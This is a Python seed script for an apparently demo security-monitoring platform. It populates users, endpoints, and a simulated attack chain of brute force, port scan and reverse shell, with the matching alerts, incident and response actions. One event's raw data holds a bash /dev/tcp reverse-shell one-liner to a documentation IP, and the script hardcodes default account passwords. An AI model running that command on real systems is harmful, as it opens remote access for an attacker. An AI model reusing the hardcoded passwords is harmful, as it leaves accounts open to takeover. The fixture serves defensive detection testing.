import os
import sys
from datetime import datetime, timedelta, timezone

# Add backend directory to sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../backend")))

from app.database.session import engine, Base, SessionLocal
from app.models.models import (
    User,
    Endpoint,
    SecurityEvent,
    Prediction,
    DetectionRule,
    Alert,
    Incident,
    IncidentEvent,
    IncidentNote,
    ResponseAction,
    ThreatIndicator,
    AuditLog
)
from app.core.security import get_password_hash
from app.detection.engine import rule_engine
from app.threat_intelligence.matcher import seed_sample_indicators

Base.metadata.create_all(bind=engine)


def seed():
    db = SessionLocal()
    try:
        print("[SentinelSeed] Seeding Users...")
        users = [
            ("admin", "admin@sentinelai.local", "SentinelAdmin2026!", "ADMIN"),
            ("analyst", "analyst@sentinelai.local", "SentinelAnalyst2026!", "ANALYST"),
            ("viewer", "viewer@sentinelai.local", "SentinelViewer2026!", "VIEWER"),
        ]
        for u, e, p, r in users:
            if not db.query(User).filter(User.username == u).first():
                db.add(User(
                    username=u,
                    email=e,
                    hashed_password=get_password_hash(p),
                    role=r,
                    is_active=True
                ))
        db.commit()

        # Load rules & threat indicators
        rule_engine.sync_rules_to_db(db)
        seed_sample_indicators(db)

        # Endpoints
        print("[SentinelSeed] Seeding Endpoints...")
        if db.query(Endpoint).count() == 0:
            eps = [
                Endpoint(hostname="sec-lab-srv01", ip_address="192.168.1.10", os_type="linux", os_version="Ubuntu 22.04 LTS", status="ACTIVE", agent_version="1.0.0"),
                Endpoint(hostname="corp-dc-01", ip_address="192.168.1.5", os_type="windows", os_version="Windows Server 2022", status="ACTIVE", agent_version="1.0.0"),
                Endpoint(hostname="fin-ws-analyst", ip_address="192.168.1.104", os_type="linux", os_version="Debian 12", status="ACTIVE", agent_version="1.0.0"),
                Endpoint(hostname="dmz-web-proxy", ip_address="10.0.0.1", os_type="linux", os_version="Alpine Linux 3.19", status="ACTIVE", agent_version="1.0.0")
            ]
            db.add_all(eps)
            db.commit()

        # Seed events and alerts if empty
        if db.query(SecurityEvent).count() == 0:
            print("[SentinelSeed] Seeding Security Events and Alerts...")
            now = datetime.now(timezone.utc)

            # 1. Brute Force Sequence
            events = []
            for i in range(5):
                ev = SecurityEvent(
                    event_source="endpoint",
                    event_type="auth_failure",
                    timestamp=(now - timedelta(minutes=25 - i)).replace(tzinfo=None),
                    source_ip="203.0.113.88",
                    source_port=49150 + i,
                    destination_ip="192.168.1.10",
                    destination_port=22,
                    protocol="TCP",
                    host_id="sec-lab-srv01",
                    username="root",
                    raw_data={"service": "sshd", "reason": "Failed password"},
                    normalized_data={"failed_attempt": i + 1}
                )
                db.add(ev)
                events.append(ev)
            db.commit()

            # 2. Port Scan Sequence
            for port in [21, 22, 23, 25, 80, 443, 8080]:
                ev = SecurityEvent(
                    event_source="zeek",
                    event_type="zeek_conn",
                    timestamp=(now - timedelta(minutes=20)).replace(tzinfo=None),
                    source_ip="198.51.100.45",
                    source_port=52100,
                    destination_ip="192.168.1.10",
                    destination_port=port,
                    protocol="TCP",
                    host_id="sec-lab-srv01",
                    raw_data={"conn_state": "REJ"},
                    normalized_data={"scanned_port": port}
                )
                db.add(ev)
            db.commit()

            # 3. Process Spawn & Outbound Beaconing
            ev_proc = SecurityEvent(
                event_source="endpoint",
                event_type="process_spawn",
                timestamp=(now - timedelta(minutes=15)).replace(tzinfo=None),
                source_ip="192.168.1.10",
                host_id="sec-lab-srv01",
                process_name="bash",
                process_pid=4812,
                raw_data={"cmdline": "/bin/bash -i >& /dev/tcp/198.51.100.45/4444 0>&1"},
                normalized_data={"details": {"parent_process": "nginx", "parent_pid": 1102}}
            )
            db.add(ev_proc)

            ev_out = SecurityEvent(
                event_source="zeek",
                event_type="zeek_conn",
                timestamp=(now - timedelta(minutes=12)).replace(tzinfo=None),
                source_ip="192.168.1.10",
                source_port=55120,
                destination_ip="198.51.100.45",
                destination_port=4444,
                protocol="TCP",
                host_id="sec-lab-srv01",
                raw_data={"bytes_sent": 8420000},
                normalized_data={"orig_bytes": 8420000}
            )
            db.add(ev_out)
            db.commit()

            # Alerts
            r_brute = db.query(DetectionRule).filter(DetectionRule.rule_id == "RULE-001").first()
            r_scan = db.query(DetectionRule).filter(DetectionRule.rule_id == "RULE-002").first()
            r_proc = db.query(DetectionRule).filter(DetectionRule.rule_id == "RULE-008").first()

            al1 = Alert(
                title="Rule Alert: Brute Force Login Detection",
                description="Detects multiple failed authentication attempts from 203.0.113.88",
                severity="HIGH",
                status="OPEN",
                source="RULE",
                rule_id=r_brute.id if r_brute else None,
                event_id=events[-1].id,
                risk_score=78.5,
                mitre_technique="T1110.001",
                risk_breakdown={
                    "final_score": 78.5,
                    "components": {"rule_score": 80.0, "ml_score": 75.0, "threat_intel_score": 90.0, "correlation_score": 70.0}
                },
                evidence={"failed_attempts": 5, "target_user": "root", "source_ip": "203.0.113.88"}
            )
            db.add(al1)

            al2 = Alert(
                title="ML Anomaly: PortScan Attack Pattern",
                description="Random Forest classified anomalous reconnaissance sweep against 7 distinct ports.",
                severity="HIGH",
                status="OPEN",
                source="ML",
                risk_score=68.2,
                mitre_technique="T1046",
                risk_breakdown={
                    "final_score": 68.2,
                    "components": {"ml_score": 92.0, "rule_score": 50.0, "correlation_score": 60.0, "threat_intel_score": 70.0}
                },
                evidence={"prediction": "PortScan", "confidence": 0.965, "ports_count": 7}
            )
            db.add(al2)

            al3 = Alert(
                title="Rule Alert: Unusual Endpoint Process Activity",
                description="Interactive reverse shell spawned by nginx web server process.",
                severity="CRITICAL",
                status="OPEN",
                source="RULE",
                rule_id=r_proc.id if r_proc else None,
                event_id=ev_proc.id,
                risk_score=94.0,
                mitre_technique="T1059",
                risk_breakdown={
                    "final_score": 94.0,
                    "components": {"rule_score": 100.0, "ml_score": 90.0, "correlation_score": 95.0, "threat_intel_score": 95.0}
                },
                evidence={"spawned": "bash", "parent": "nginx", "cmdline": "reverse shell"}
            )
            db.add(al3)
            db.commit()

            # Incident
            analyst_user = db.query(User).filter(User.username == "analyst").first()
            inc = Incident(
                title="Active Intrusion & Reverse Shell on Web Server",
                description="Multi-stage attack chain observed on sec-lab-srv01: Reconnaissance -> SSH Brute Force -> Reverse Shell execution -> Outbound C2 communication.",
                severity="CRITICAL",
                status="INVESTIGATING",
                assigned_to_user_id=analyst_user.id if analyst_user else None,
                risk_score=92.5,
                mitre_tactics=["Initial Access", "Execution", "Command and Control", "Reconnaissance"]
            )
            db.add(inc)
            db.commit()
            db.refresh(inc)

            # Link events to incident
            for ev in events[:3]:
                db.add(IncidentEvent(incident_id=inc.id, event_id=ev.id))
            db.add(IncidentEvent(incident_id=inc.id, event_id=ev_proc.id))
            db.add(IncidentEvent(incident_id=inc.id, event_id=ev_out.id))

            # Incident Notes
            db.add(IncidentNote(
                incident_id=inc.id,
                user_id=analyst_user.id if analyst_user else None,
                note="Initial triage completed. Confirmed unauthorized process execution spawned by PID 1102 (nginx). Recommending immediate host containment."
            ))

            # Response action recommendation
            db.add(ResponseAction(
                incident_id=inc.id,
                alert_id=al3.id,
                action_type="ISOLATE_HOST",
                target="sec-lab-srv01",
                status="PENDING_APPROVAL",
                rollback_available=True
            ))
            db.add(ResponseAction(
                incident_id=inc.id,
                alert_id=al1.id,
                action_type="BLOCK_IP",
                target="203.0.113.88",
                status="PENDING_APPROVAL",
                rollback_available=True
            ))

            # Initial Audit Log
            db.add(AuditLog(
                user_id=analyst_user.id if analyst_user else None,
                action="INCIDENT_ASSIGNED",
                target_type="INCIDENT",
                target_id=str(inc.id),
                details={"assigned_to": "analyst", "severity": "CRITICAL"}
            ))

            db.commit()
            print("[SentinelSeed] Seeding completed successfully!")
    finally:
        db.close()


if __name__ == "__main__":
    seed()
